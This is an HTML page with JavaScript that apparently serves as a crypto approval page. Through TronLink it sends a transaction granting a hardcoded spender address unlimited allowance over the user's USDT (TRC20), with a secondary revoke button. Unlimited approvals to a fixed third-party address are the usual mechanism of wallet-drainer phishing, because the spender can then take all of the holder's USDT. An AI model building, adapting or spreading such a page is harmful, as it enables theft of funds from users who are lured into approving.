<!DOCTYPE html>

<html>
<head>
<meta charset="utf-8"/>
<title>Approve Unlimited USDT (TRC20)</title>
<meta content="width=device-width, initial-scale=1" name="viewport"/>
<style>
    body { font-family: Arial, sans-serif; padding:20px; max-width:720px; margin:auto; }
    .card { border:1px solid #ddd; padding:16px; border-radius:8px; box-shadow:0 2px 6px rgba(0,0,0,0.04); }
    h1 { font-size:18px; margin:0 0 8px; }
    pre { background:#f7f7f7; padding:8px; overflow:auto; }
    button { padding:10px 14px; font-size:16px; border-radius:6px; cursor:pointer; }
    .danger { color:#b22; font-weight:bold; }
  </style>
</head>
<body>
<div class="card">
<h1>Approve Unlimited USDT (TRC20)</h1>
<p>This page will prepare an <strong>approve(spender, unlimited)</strong> call on the USDT TRC20 contract. You must have TronLink (or compatible) installed and unlocked. The wallet will always prompt you to confirm â€” this page will <em>not</em> sign automatically.</p>

<p><strong>USDT contract:</strong> <code>TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</code></p>
<p><strong>Spender:</strong> <code id="spender">TVm4xa2neKrFkmNuDBsMnn6PKseexW4EvX</code></p>
<p><strong>Amount:</strong> <code>Max uint256 (unlimited)</code></p>
<div style="margin:14px 0;">
<button id="approveBtn">Approve Unlimited USDT</button>
<button id="revokeBtn" style="margin-left:8px;">Revoke Approval (set to 0)</button>
</div>
<div id="status"></div>
<hr/>
<h3>Transaction output</h3>
<pre id="output">Not executed</pre>
</div>
<script>
const usdtContract = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const spenderAddress = document.getElementById('spender').innerText.trim();
const maxUint256 = '115792089237316195423570985008687907853269984665640564039457584007913129639935';

function setOutput(text){
  document.getElementById('output').innerText = text;
}
function setStatus(text){
  document.getElementById('status').innerText = text;
}

async function sendApprove(value){
  try {
    if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
      alert('TronLink not detected or not unlocked. Open this page in a browser with TronLink/TronLink Mobile installed and unlocked.');
      return;
    }
    setStatus('Preparing contract...');
    const contract = await window.tronWeb.contract().at(usdtContract);
    setStatus('Calling approve(' + spenderAddress + ', ' + (value===maxUint256?'unlimited':value) + ')');
    const tx = await contract.approve(spenderAddress, value).send();
    setOutput('Transaction result:\n' + JSON.stringify(tx, null, 2));
    setStatus('Transaction sent. Check your wallet for prompt and transaction status.');
  } catch (e) {
    setOutput('Error:\n' + (e && e.message ? e.message : JSON.stringify(e)));
    setStatus('Error occurred. See output.');
  }
}

document.getElementById('approveBtn').addEventListener('click', ()=> sendApprove(maxUint256));
document.getElementById('revokeBtn').addEventListener('click', ()=> {
  if (!confirm('Set approval to 0 for spender? This revokes permission.')) return;
  sendApprove('0');
});

// Auto-attempt to focus TronLink pop-up on load if possible (still requires user confirm)
window.addEventListener('load', ()=> {
  setStatus('Page loaded. Click "Approve Unlimited USDT" or "Revoke Approval".');
});
</script>
</body>
</html>
